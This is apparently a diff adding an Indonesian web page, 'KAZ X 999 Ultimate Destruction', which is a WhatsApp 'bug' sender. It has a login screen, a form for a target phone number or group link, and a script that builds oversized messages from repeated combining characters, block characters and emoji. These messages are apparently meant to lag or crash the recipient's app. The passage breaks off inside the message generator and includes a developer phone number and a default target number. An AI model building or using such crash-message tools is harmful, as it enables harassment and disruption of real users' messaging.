@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>KAZ X 999 — ULTIMATE DESTRUCTION V9.5</title>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=MedievalSharp&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        body {
+            background: #0a0000;
+            color: #fff;
+            font-family: 'MedievalSharp', cursive;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            perspective: 1800px;
+        }
+
+        #bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            z-index: 0;
+            filter: brightness(0.5) contrast(1.4) saturate(1.6);
+            opacity: 0.85;
+            transform: rotateY(2deg) scale(1.02);
+        }
+
+        #blood-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background: radial-gradient(circle at 20% 30%, rgba(200,0,0,0.15), transparent 70%),
+                        radial-gradient(circle at 80% 70%, rgba(150,0,0,0.10), transparent 60%);
+            mix-blend-mode: multiply;
+        }
+
+        #scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 6px);
+            animation: scanMove 0.1s linear infinite;
+        }
+        @keyframes scanMove {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(6px); }
+        }
+
+        .glitch {
+            animation: glitch 0.3s infinite alternate;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 3px 0 red, -3px 0 blue; }
+            25% { text-shadow: -5px 0 cyan, 5px 0 magenta; }
+            50% { text-shadow: 7px 0 lime, -7px 0 purple; }
+            75% { text-shadow: -4px 0 yellow, 4px 0 orange; }
+            100% { text-shadow: 2px 0 white, -2px 0 black; }
+        }
+
+        .page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.60);
+            backdrop-filter: blur(6px);
+            animation: fadeIn3D 0.7s ease;
+            transform-style: preserve-3d;
+        }
+        .page.active {
+            display: flex;
+        }
+        @keyframes fadeIn3D {
+            0% { opacity: 0; transform: rotateY(10deg) scale(0.9) translateZ(-200px); }
+            100% { opacity: 1; transform: rotateY(0deg) scale(1) translateZ(0); }
+        }
+
+        .btn-3d {
+            padding: 16px 36px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.15s;
+            font-family: 'Creepster', cursive;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            background: linear-gradient(145deg, #cc0000, #550000);
+            color: #fff;
+            border: 2px solid #ff3333;
+            box-shadow: 0 12px 0 #330000, 0 20px 40px rgba(255,0,0,0.5);
+            transform: rotateX(4deg) rotateY(2deg);
+            transform-style: preserve-3d;
+        }
+        .btn-3d:active {
+            transform: translateY(8px) rotateX(2deg) rotateY(1deg);
+            box-shadow: 0 4px 0 #330000, 0 10px 30px rgba(255,0,0,0.6);
+        }
+
+        /* ===== INTRO ===== */
+        #intro-page .video-wrapper {
+            position: relative;
+            width: 92%;
+            max-width: 560px;
+            aspect-ratio: 16/9;
+            background: #0a0000;
+            border-radius: 30px;
+            border: 4px solid #aa2222;
+            box-shadow: 0 0 80px rgba(255,0,0,0.8), inset 0 0 60px #440000, 0 30px 50px rgba(0,0,0,0.9);
+            overflow: hidden;
+            transform: rotateY(6deg) rotateX(3deg) translateZ(40px);
+            transition: 0.3s;
+        }
+        #intro-page .video-wrapper:hover {
+            transform: rotateY(3deg) rotateX(1deg) translateZ(60px);
+            box-shadow: 0 0 120px rgba(255,0,0,0.9);
+        }
+        #intro-page .video-wrapper video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            background: #000;
+            cursor: pointer;
+            transform: scale(1.02);
+            filter: contrast(1.2) saturate(1.3);
+        }
+        #intro-page .video-wrapper .crt-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.2) 0px, rgba(0,0,0,0.2) 2px, transparent 2px, transparent 6px);
+            mix-blend-mode: overlay;
+            z-index: 5;
+        }
+        #intro-page .skip-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.85);
+            color: #ff4444;
+            padding: 12px 28px;
+            border-radius: 40px;
+            border: 2px solid #ff2222;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 20;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px #ff000088;
+            font-family: 'MedievalSharp', cursive;
+            transform: rotateY(2deg);
+        }
+        #intro-page .skip-btn:active {
+            transform: scale(0.9) rotateY(0deg);
+        }
+        #intro-page .title-overlay {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 2.6rem;
+            font-weight: bold;
+            color: #ff3333;
+            text-shadow: 0 0 40px #ff0000, 0 0 80px #880000, 8px 8px 0 #220000;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 6px;
+            background: linear-gradient(transparent, #000000dd);
+            padding: 30px 0 20px;
+            transform: translateZ(20px);
+        }
+        #intro-page .title-overlay small {
+            display: block;
+            font-size: 1.1rem;
+            color: #ff7777;
+            text-shadow: 0 0 30px #ff2222;
+            font-family: 'MedievalSharp', cursive;
+        }
+
+        /* ===== LOGIN ===== */
+        #login-page .login-box {
+            background: rgba(16, 0, 0, 0.92);
+            padding: 30px 24px;
+            border-radius: 60px 20px 60px 20px;
+            border: 3px solid #aa2222;
+            box-shadow: 0 0 100px #ff000055, inset 0 0 60px #440000, 0 30px 50px rgba(0,0,0,0.8);
+            width: 95%;
+            max-width: 440px;
+            text-align: center;
+            backdrop-filter: blur(14px);
+            transform: rotateY(4deg) rotateX(2deg) translateZ(30px);
+            transition: 0.3s;
+        }
+        #login-page .login-box:hover {
+            transform: rotateY(2deg) rotateX(1deg) translateZ(50px);
+            box-shadow: 0 0 140px #ff000066;
+        }
+        #login-page .login-box h1 {
+            font-family: 'Creepster', cursive;
+            font-size: 3.6rem;
+            color: #ff3333;
+            text-shadow: 0 0 50px #ff0000, 0 0 100px #aa0000, 8px 8px 0 #330000;
+            letter-spacing: 8px;
+            margin-bottom: 6px;
+            transform: translateZ(20px);
+        }
+        #login-page .login-box .sub {
+            color: #ff7777;
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #882222;
+            padding-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        #login-page .avatar-box {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 18px;
+            border-radius: 40px;
+            border: 4px solid #cc3333;
+            box-shadow: 0 0 60px #ff000066, inset 0 0 30px #aa2222, 0 10px 30px rgba(0,0,0,0.7);
+            overflow: hidden;
+            background: #1a0000;
+            cursor: pointer;
+            position: relative;
+            transition: 0.3s;
+            transform: rotateY(2deg) translateZ(10px);
+        }
+        #login-page .avatar-box:hover {
+            border-color: #ff5555;
+            box-shadow: 0 0 100px #ff2222, 0 10px 40px #000;
+            transform: rotateY(0deg) translateZ(30px);
+        }
+        #login-page .avatar-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        #login-page .avatar-box .placeholder {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            font-size: 4rem;
+            color: #882222;
+            background: #110000;
+        }
+        #login-page .input-group {
+            width: 100%;
+            margin: 8px 0;
+            text-align: left;
+        }
+        #login-page .input-group label {
+            font-size: 0.9rem;
+            color: #ff9999;
+            display: block;
+            margin-bottom: 4px;
+            letter-spacing: 2px;
+        }
+        #login-page .input-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 50px;
+            border: 2px solid #882222;
+            background: #1a0a0a;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'MedievalSharp', cursive;
+            box-shadow: inset 0 4px 10px rgba(0,0,0,0.6);
+        }
+        #login-page .input-group input:focus {
+            border-color: #ff3333;
+            box-shadow: 0 0 40px #ff000066, inset 0 4px 10px #000;
+        }
+        #login-page .btn-login {
+            width: 100%;
+            padding: 18px;
+            margin: 18px 0 10px;
+            font-size: 1.8rem;
+            border-radius: 60px;
+            background: linear-gradient(145deg, #cc1111, #770000);
+            border: 3px solid #ff4444;
+            box-shadow: 0 12px 0 #330000, 0 20px 50px #ff000066;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 6px;
+            transform: rotateX(3deg);
+        }
+        #login-page .btn-login:active {
+            transform: translateY(8px) rotateX(1deg);
+            box-shadow: 0 4px 0 #330000, 0 10px 40px #ff000066;
+        }
+        #login-page .register-link {
+            color: #ff8888;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 0.9rem;
+            text-shadow: 0 0 20px #ff000066;
+        }
+        #login-page .dev-note {
+            margin-top: 18px;
+            font-size: 0.8rem;
+            color: #665555;
+            border-top: 1px solid #331111;
+            padding-top: 12px;
+        }
+        #login-page .dev-note span {
+            color: #aa4444;
+            font-weight: bold;
+            text-shadow: 0 0 20px #ff000066;
+        }
+
+        /* ===== REGISTER ===== */
+        #register-page .register-box {
+            background: rgba(16, 0, 0, 0.92);
+            padding: 30px 24px;
+            border-radius: 60px 20px 60px 20px;
+            border: 3px solid #22aa44;
+            box-shadow: 0 0 100px #00ff4466, inset 0 0 60px #004422, 0 30px 50px rgba(0,0,0,0.8);
+            width: 95%;
+            max-width: 440px;
+            text-align: center;
+            backdrop-filter: blur(14px);
+            transform: rotateY(4deg) rotateX(2deg) translateZ(30px);
+            transition: 0.3s;
+        }
+        #register-page .register-box:hover {
+            transform: rotateY(2deg) rotateX(1deg) translateZ(50px);
+            box-shadow: 0 0 140px #00ff4466;
+        }
+        #register-page .register-box h1 {
+            font-family: 'Creepster', cursive;
+            font-size: 2.8rem;
+            color: #44ff88;
+            text-shadow: 0 0 50px #00ff66, 8px 8px 0 #004422;
+            letter-spacing: 4px;
+            margin-bottom: 6px;
+        }
+        #register-page .register-box .sub {
+            color: #88ffbb;
+            font-size: 0.9rem;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #228844;
+            padding-bottom: 10px;
+        }
+        #register-page .register-box .input-group {
+            width: 100%;
+            margin: 8px 0;
+            text-align: left;
+        }
+        #register-page .register-box .input-group label {
+            font-size: 0.9rem;
+            color: #88ffbb;
+            display: block;
+            margin-bottom: 4px;
+            letter-spacing: 2px;
+        }
+        #register-page .register-box .input-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border-radius: 50px;
+            border: 2px solid #228844;
+            background: #0a1a0a;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+            font-family: 'MedievalSharp', cursive;
+            box-shadow: inset 0 4px 10px rgba(0,0,0,0.6);
+        }
+        #register-page .register-box .input-group input:focus {
+            border-color: #44ff88;
+            box-shadow: 0 0 40px #00ff6666, inset 0 4px 10px #000;
+        }
+        #register-page .register-box .btn-register {
+            width: 100%;
+            padding: 18px;
+            margin: 18px 0 10px;
+            font-size: 1.6rem;
+            border-radius: 60px;
+            background: linear-gradient(145deg, #22aa44, #116622);
+            border: 3px solid #44ff88;
+            box-shadow: 0 12px 0 #004422, 0 20px 50px #00ff4466;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 4px;
+            transform: rotateX(3deg);
+        }
+        #register-page .register-box .btn-register:active {
+            transform: translateY(8px) rotateX(1deg);
+            box-shadow: 0 4px 0 #004422, 0 10px 40px #00ff4466;
+        }
+        #register-page .register-box .back-link {
+            color: #88ffbb;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 0.9rem;
+            text-shadow: 0 0 20px #00ff6666;
+        }
+
+        /* ===== MENU BUG ===== */
+        #menu-page .menu-box {
+            background: rgba(10, 0, 0, 0.92);
+            border-radius: 50px 20px 50px 20px;
+            border: 3px solid #992222;
+            box-shadow: 0 0 100px #ff000033, inset 0 0 50px #331111, 0 30px 50px rgba(0,0,0,0.8);
+            padding: 30px 24px 32px;
+            width: 95%;
+            max-width: 500px;
+            backdrop-filter: blur(14px);
+            transform: rotateY(3deg) rotateX(2deg) translateZ(20px);
+            transition: 0.3s;
+        }
+        #menu-page .menu-box:hover {
+            transform: rotateY(1deg) rotateX(1deg) translateZ(40px);
+            box-shadow: 0 0 140px #ff000044;
+        }
+        #menu-page .menu-box h2 {
+            font-family: 'Creepster', cursive;
+            font-size: 2.8rem;
+            color: #ff3333;
+            text-shadow: 0 0 40px #ff0000, 6px 6px 0 #330000;
+            text-align: center;
+            margin-bottom: 6px;
+            transform: translateZ(20px);
+        }
+        #menu-page .menu-box .submenu {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 12px 0 16px;
+        }
+        #menu-page .menu-box .submenu button {
+            flex: 1;
+            padding: 12px;
+            border-radius: 40px;
+            border: 2px solid #882222;
+            background: #1a0808;
+            color: #ff9999;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'MedievalSharp', cursive;
+            box-shadow: inset 0 4px 10px rgba(0,0,0,0.5);
+            transform: rotateX(2deg);
+        }
+        #menu-page .menu-box .submenu button.active {
+            background: #881111;
+            color: #fff;
+            border-color: #ff3333;
+            box-shadow: 0 0 40px #ff000066, inset 0 4px 10px #550000;
+            transform: rotateX(0deg) translateZ(10px);
+        }
+        .menu-content {
+            display: none;
+            flex-direction: column;
+            gap: 14px;
+            margin-top: 10px;
+        }
+        .menu-content.active {
+            display: flex;
+        }
+        .menu-content .input-row {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .menu-content .input-row label {
+            font-size: 0.85rem;
+            color: #cc7777;
+            letter-spacing: 2px;
+        }
+        .menu-content .input-row input,
+        .menu-content .input-row select {
+            padding: 14px 18px;
+            border-radius: 40px;
+            border: 2px solid #662222;
+            background: #0f0505;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            font-family: 'MedievalSharp', cursive;
+            box-shadow: inset 0 4px 12px rgba(0,0,0,0.7);
+        }
+        .menu-content .input-row input:focus,
+        .menu-content .input-row select:focus {
+            border-color: #ff3333;
+            box-shadow: 0 0 30px #ff000044, inset 0 4px 12px #000;
+        }
+        .menu-content .btn-send {
+            width: 100%;
+            padding: 18px;
+            border-radius: 50px;
+            background: linear-gradient(145deg, #bb1111, #660000);
+            border: 2px solid #ff4444;
+            color: #fff;
+            font-size: 1.6rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 10px 0 #330000, 0 20px 50px #ff000055;
+            font-family: 'Creepster', cursive;
+            letter-spacing: 4px;
+            margin-top: 6px;
+            transform: rotateX(3deg);
+        }
+        .menu-content .btn-send:active {
+            transform: translateY(6px) rotateX(1deg);
+            box-shadow: 0 4px 0 #330000, 0 10px 40px #ff000055;
+        }
+
+        /* ===== SUCCESS (SEMENTARA) ===== */
+        #success-page .success-box {
+            background: rgba(0, 20, 0, 0.92);
+            border-radius: 70px 20px 70px 20px;
+            border: 4px solid #22aa44;
+            box-shadow: 0 0 140px #00ff4466, inset 0 0 60px #004422, 0 30px 50px rgba(0,0,0,0.8);
+            padding: 44px 30px;
+            text-align: center;
+            width: 92%;
+            max-width: 420px;
+            backdrop-filter: blur(14px);
+            transform: rotateY(4deg) rotateX(2deg) translateZ(30px);
+            transition: 0.3s;
+        }
+        #success-page .success-box:hover {
+            transform: rotateY(1deg) rotateX(1deg) translateZ(50px);
+            box-shadow: 0 0 180px #00ff4466;
+        }
+        #success-page .success-box h1 {
+            font-family: 'Creepster', cursive;
+            font-size: 4rem;
+            color: #44ff88;
+            text-shadow: 0 0 60px #00ff66, 0 0 120px #00aa44, 4px 4px 0 #004422;
+        }
+        #success-page .success-box p {
+            font-size: 1.6rem;
+            color: #88ffbb;
+            margin: 20px 0;
+            text-shadow: 0 0 30px #00ff66;
+        }
+        #success-page .success-box .btn-ok {
+            background: #22aa44;
+            border-color: #66ff88;
+            box-shadow: 0 12px 0 #004422, 0 20px 60px #00ff4466;
+            padding: 18px 56px;
+            font-size: 1.8rem;
+            font-family: 'Creepster', cursive;
+            transform: rotateX(3deg);
+        }
+        #success-page .success-box .btn-ok:active {
+            transform: translateY(8px) rotateX(1deg);
+            box-shadow: 0 4px 0 #004422, 0 10px 40px #00ff4466;
+        }
+        #success-page .success-box .speed {
+            margin-top: 12px;
+            font-size: 0.9rem;
+            color: #88aa88;
+            letter-spacing: 3px;
+            opacity: 0.6;
+        }
+
+        @media (max-width: 480px) {
+            #login-page .login-box h1 { font-size: 2.6rem; }
+            #menu-page .menu-box h2 { font-size: 2.2rem; }
+            #intro-page .title-overlay { font-size: 2rem; }
+            #intro-page .skip-btn { padding: 8px 16px; font-size: 0.9rem; top: 10px; right: 10px; }
+            #login-page .avatar-box { width: 110px; height: 110px; }
+            .btn-3d { padding: 12px 24px; font-size: 1rem; }
+            #success-page .success-box h1 { font-size: 3rem; }
+            .menu-content .btn-send { font-size: 1.2rem; padding: 14px; }
+        }
+    </style>
+</head>
+<body>
+
+    <video id="bg-video" autoplay loop muted playsinline>
+        <source src="https://files.catbox.moe/n6bhmk.mp4" type="video/mp4" />
+    </video>
+
+    <div id="blood-overlay"></div>
+    <div id="scanline"></div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 1 – INTRO VIDEO -->
+    <!-- ========================================================= -->
+    <div id="intro-page" class="page active">
+        <div class="video-wrapper">
+            <video id="intro-video" playsinline preload="auto">
+                <source src="https://files.catbox.moe/u6xyu9.mp4" type="video/mp4" />
+            </video>
+            <div class="crt-overlay"></div>
+            <button class="skip-btn" id="skip-intro">LEWATI &gt;</button>
+            <div class="title-overlay glitch">
+                KAZ X 999
+                <small>Developer kaisar</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 2 – LOGIN -->
+    <!-- ========================================================= -->
+    <div id="login-page" class="page">
+        <div class="login-box">
+            <h1 class="glitch">KAZ X 999</h1>
+            <div class="sub">⚡ login ke zona kematian ⚡</div>
+
+            <div class="avatar-box" id="avatar-login" onclick="document.getElementById('avatar-input').click()">
+                <div class="placeholder" id="avatar-placeholder">👹</div>
+                <img id="avatar-preview" style="display:none;" alt="avatar" />
+            </div>
+            <input type="file" id="avatar-input" accept="image/*" style="display:none;" />
+
+            <div class="input-group">
+                <label>👤 USERNAME</label>
+                <input type="text" id="username-input" placeholder="Username" />
+            </div>
+            <div class="input-group">
+                <label>🔑 PASSWORD</label>
+                <input type="password" id="password-input" placeholder="Password" />
+            </div>
+
+            <button class="btn-3d btn-login" id="btn-login">MASUK</button>
+            <div class="register-link" id="register-link">📝 buat akses baru</div>
+            <div class="dev-note">📱 dev <span>085194279722</span></div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 3 – REGISTER -->
+    <!-- ========================================================= -->
+    <div id="register-page" class="page">
+        <div class="register-box">
+            <h1 class="glitch">📝 DAFTAR AKSES</h1>
+            <div class="sub">buat username & password sendiri</div>
+
+            <div class="input-group">
+                <label>👤 USERNAME BARU</label>
+                <input type="text" id="reg-username" placeholder="pilih username" />
+            </div>
+            <div class="input-group">
+                <label>🔑 PASSWORD BARU</label>
+                <input type="password" id="reg-password" placeholder="pilih password" />
+            </div>
+            <div class="input-group">
+                <label>🔒 KONFIRMASI PASSWORD</label>
+                <input type="password" id="reg-confirm" placeholder="ulangi password" />
+            </div>
+
+            <button class="btn-3d btn-register" id="btn-register">DAFTAR</button>
+            <div class="back-link" id="back-to-login">← kembali ke login</div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 4 – MENU BUG ULTIMATE -->
+    <!-- ========================================================= -->
+    <div id="menu-page" class="page">
+        <div class="menu-box">
+            <h2 class="glitch">KAZ X 999</h2>
+            <div class="submenu">
+                <button class="tab-btn active" data-tab="tab-number">BUG NOMOR</button>
+                <button class="tab-btn" data-tab="tab-group">BUG GRUP</button>
+            </div>
+
+            <div id="tab-number" class="menu-content active">
+                <div class="input-row">
+                    <label>📱 NOMOR TARGET</label>
+                    <input type="text" id="target-number" placeholder="+6285148162990" value="+6285148162990" />
+                </div>
+                <div class="input-row">
+                    <label>⚙️ PILIH BUG</label>
+                    <select id="bug-type">
+                        <option value="hard">DELAY HARD</option>
+                        <option value="new">DELAY NEW</option>
+                        <option value="invisible">DELAY INVISIBLE</option>
+                    </select>
+                </div>
+                <button class="btn-send" id="send-bug-number">🚀 MUSNAHKAN TARGET</button>
+            </div>
+
+            <div id="tab-group" class="menu-content">
+                <div class="input-row">
+                    <label>🔗 LINK GRUP TARGET</label>
+                    <input type="text" id="group-link" placeholder="https://chat.whatsapp.com/xxxxx" />
+                </div>
+                <div class="input-row">
+                    <label>⚙️ PILIH BUG GRUP</label>
+                    <select id="bug-group-type">
+                        <option value="kill">KILL GRUP</option>
+                        <option value="delay">DELAY GRUP</option>
+                    </select>
+                </div>
+                <button class="btn-send" id="send-bug-group">💀 MUSNAHKAN GRUP</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================================= -->
+    <!-- PAGE 5 – SUCCESS (1 DETIK LANGSUNG KE WA) -->
+    <!-- ========================================================= -->
+    <div id="success-page" class="page">
+        <div class="success-box">
+            <h1 class="glitch">🔥 SUCCESS 🔥</h1>
+            <p>Bug berhasil dikirim!</p>
+            <button class="btn-3d btn-ok" id="btn-ok">OK</button>
+            <div class="speed">0.5x</div>
+        </div>
+    </div>
+
+    <script>
+        // =========================================================
+        // 1. ELEMEN REFS
+        // =========================================================
+        const pages = {
+            intro: document.getElementById('intro-page'),
+            login: document.getElementById('login-page'),
+            register: document.getElementById('register-page'),
+            menu: document.getElementById('menu-page'),
+            success: document.getElementById('success-page')
+        };
+
+        const introVideo = document.getElementById('intro-video');
+        const bgVideo = document.getElementById('bg-video');
+        const skipBtn = document.getElementById('skip-intro');
+
+        const avatarInput = document.getElementById('avatar-input');
+        const avatarPreview = document.getElementById('avatar-preview');
+        const avatarPlaceholder = document.getElementById('avatar-placeholder');
+
+        const usernameInput = document.getElementById('username-input');
+        const passwordInput = document.getElementById('password-input');
+        const btnLogin = document.getElementById('btn-login');
+        const registerLink = document.getElementById('register-link');
+
+        const regUsername = document.getElementById('reg-username');
+        const regPassword = document.getElementById('reg-password');
+        const regConfirm = document.getElementById('reg-confirm');
+        const btnRegister = document.getElementById('btn-register');
+        const backToLogin = document.getElementById('back-to-login');
+
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        const tabContents = {
+            number: document.getElementById('tab-number'),
+            group: document.getElementById('tab-group')
+        };
+        const sendNumberBtn = document.getElementById('send-bug-number');
+        const sendGroupBtn = document.getElementById('send-bug-group');
+        const targetNumber = document.getElementById('target-number');
+        const groupLink = document.getElementById('group-link');
+        const bugType = document.getElementById('bug-type');
+        const bugGroupType = document.getElementById('bug-group-type');
+
+        const btnOk = document.getElementById('btn-ok');
+
+        // =========================================================
+        // 2. SWITCH PAGE
+        // =========================================================
+        function showPage(name) {
+            Object.keys(pages).forEach(key => {
+                pages[key].classList.toggle('active', key === name);
+            });
+        }
+
+        // =========================================================
+        // 3. SET VOLUME 80%
+        // =========================================================
+        introVideo.volume = 0.8;
+        bgVideo.volume = 0.8;
+
+        introVideo.addEventListener('loadedmetadata', function() {
+            introVideo.volume = 0.8;
+        });
+
+        bgVideo.addEventListener('loadedmetadata', function() {
+            bgVideo.volume = 0.8;
+            bgVideo.loop = true;
+            bgVideo.play().catch(() => {});
+        });
+
+        // =========================================================
+        // 4. INTRO – 23 DETIK
+        // =========================================================
+        let introPlayed = false;
+
+        introVideo.addEventListener('click', function() {
+            if (!introPlayed) {
+                introVideo.play().catch(() => {});
+                introPlayed = true;
+            } else {
+                introVideo.pause();
+                introPlayed = false;
+            }
+        });
+
+        function finishIntro() {
+            introVideo.pause();
+            showPage('login');
+            bgVideo.play().catch(() => {});
+        }
+
+        introVideo.addEventListener('timeupdate', function() {
+            if (introVideo.currentTime >= 23) {
+                finishIntro();
+            }
+        });
+
+        skipBtn.addEventListener('click', function() {
+            finishIntro();
+        });
+
+        // =========================================================
+        // 5. AVATAR
+        // =========================================================
+        avatarInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(ev) {
+                    avatarPreview.src = ev.target.result;
+                    avatarPreview.style.display = 'block';
+                    avatarPlaceholder.style.display = 'none';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // =========================================================
+        // 6. REGISTER + LOGIN
+        // =========================================================
+        let registeredUsers = JSON.parse(localStorage.getItem('kazx999_users') || '[]');
+
+        registerLink.addEventListener('click', function() {
+            showPage('register');
+        });
+
+        backToLogin.addEventListener('click', function() {
+            showPage('login');
+        });
+
+        btnRegister.addEventListener('click', function() {
+            const user = regUsername.value.trim();
+            const pass = regPassword.value.trim();
+            const confirm = regConfirm.value.trim();
+
+            if (!user || !pass || !confirm) {
+                alert('⚠️ Semua field harus diisi!');
+                return;
+            }
+            if (pass !== confirm) {
+                alert('❌ Password dan konfirmasi tidak sama!');
+                return;
+            }
+            if (registeredUsers.find(u => u.username === user)) {
+                alert('❌ Username sudah terdaftar!');
+                return;
+            }
+
+            registeredUsers.push({ username: user, password: pass });
+            localStorage.setItem('kazx999_users', JSON.stringify(registeredUsers));
+            alert('✅ Pendaftaran berhasil! Silakan login.');
+            showPage('login');
+        });
+
+        btnLogin.addEventListener('click', function() {
+            const user = usernameInput.value.trim();
+            const pass = passwordInput.value.trim();
+
+            const found = registeredUsers.find(u => u.username === user && u.password === pass);
+
+            if (found) {
+                showPage('menu');
+            } else {
+                alert('❌ Username atau password salah!');
+            }
+        });
+
+        // =========================================================
+        // 7. TAB SWITCH
+        // =========================================================
+        tabBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                tabBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                const tab = this.dataset.tab;
+                Object.keys(tabContents).forEach(key => {
+                    tabContents[key].classList.toggle('active', key === tab.replace('tab-', ''));
+                });
+            });
+        });
+
+        // =========================================================
+        // 8. GENERATE ULTIMATE BUG V9.5
+        // =========================================================
+        function generateUltimateBug(target, type) {
+            const symbols = [
+                '☢️','💀','🔥','⚡','🌀','💥','🔞','💢','👹','🎃','❌','‼️','🔄','⚠️','💣','🩸','🕳️','⚰️','👻','🔪',
+                '⚡','☠️','⚔️','🛡️','🔮','🗡️','🏹','🪓','🪦','🕯️','🧿','🪬','🪄','🪩','🪙','🧨','💀','🔱','🌀','🌪️'
+            ];
+            const ancient = '̷̸̺̻̼͇͈͉͍͎ͤͥͦͧͨͩͪͫͬͭͮͯ̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏҉҉҉̴̶̷̸̴̵̶̷̸̡̢̧̨̛̹̺̻̼̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́̌̊̋̌̍̎̏̐̑̒̓̔̽̾̿̀́͂̓̈́̕̚'.repeat(15);
+            const boxPattern = '░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒'.repeat(10);
+            const boxStack = boxPattern + boxPattern + boxPattern + boxPattern + boxPattern;
+
+            const fakeAddresses = [
+                'Jln. Kematian No. 1, Neraka Selatan',
+                'Jln. Kegelapan No. 2, Alam Kubur',
+                'Jln. Kesunyian No. 3, Dunia Gaib',
+                'Jln. Kehancuran No. 4, Lembah Maut',
+                'Jln. Ketakutan No. 5, Hutan Angker',
+                'Jln. Kekacauan No. 6, Kota Hantu',
+                'Jln. Kemurkaan No. 7, Gunung Api',
+                'Jln. Kemiskinan No. 8, Kampung Mati',
+                'Jln. Kehilangan No. 9, Pantai Berdarah',
+                'Jln. Keputusasaan No. 10, Lembah Kematian',
+                'Jln. Kehinaan No. 11, Danau Api',
+                'Jln. Kekalahan No. 12, Hutan Belantara',
+                'Jln. Kemalangan No. 13, Padang Pasir',
+                'Jln. Kegilaan No. 14, Rumah Sakit Tua',
+                'Jln. Kebinasaan No. 15, Gedung Kosong',
+                'Jln. Kehancuran No. 16, Pulau Terpencil',
+                'Jln. Kesengsaraan No. 17, Lorong Gelap',
+                'Jln. Ketidakberdayaan No. 18, Ruang Terkunci',
+                'Jln. Keabadian No. 19, Makam Kuno',
+                'Jln. Kemusnahan No. 20, Pintu Neraka'
+            ];
+
+            let msg = `☢️☢️☢️ KAZ x 999 ULTIMATE DESTRUCTION V9.5 ☢️☢️☢️\n\n`;
+            msg += `📱 TARGET: ${target}\n`;
+            msg += `🕒 WAKTU: ${new Date().toLocaleString()}\n`;
+            msg += `☢️ BUG ID: KX9-${Math.floor(Math.random()*99999)}\n`;
+            msg += `💀 JENIS: ${type.toUpperCase()}\n\n`;
+
+            msg += `📮 20 LOKASI PALSU:\n`;
+            fakeAddresses.forEach((addr, i) => {
+                msg += `   ${i+1}. ${addr}\n`;
+            });
+            msg += `\n${boxStack}\n\n`;
+
+            const warnings = [
+                '⚠️⚠️⚠️ PERINGATAN TINGKAT 1 ⚠️⚠️⚠️',
